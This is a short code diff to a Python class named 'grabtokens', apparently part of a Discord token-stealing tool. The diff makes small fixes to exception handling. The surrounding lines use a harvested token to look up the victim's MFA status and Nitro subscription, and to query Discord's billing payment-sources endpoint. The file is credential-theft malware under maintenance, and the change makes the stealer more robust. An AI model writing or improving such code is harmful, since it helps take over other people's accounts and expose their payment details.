@@ -250,7 +250,7 @@ class grabtokens():
                     mfa = "✅"
                 if r.json()['mfa_enabled'] == False:
                     mfa = "❌"
-            except KeyError:
+            except Exception:
                 mfa = '❌'
                 
             try:
@@ -258,7 +258,7 @@ class grabtokens():
                     nitro = 'Nitro Classic'
                 elif r.json()['premium_type'] == 2:
                     nitro = 'Nitro Boost'
-            except KeyError :
+            except KeyError:
                 nitro = 'None'
 
             b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token))
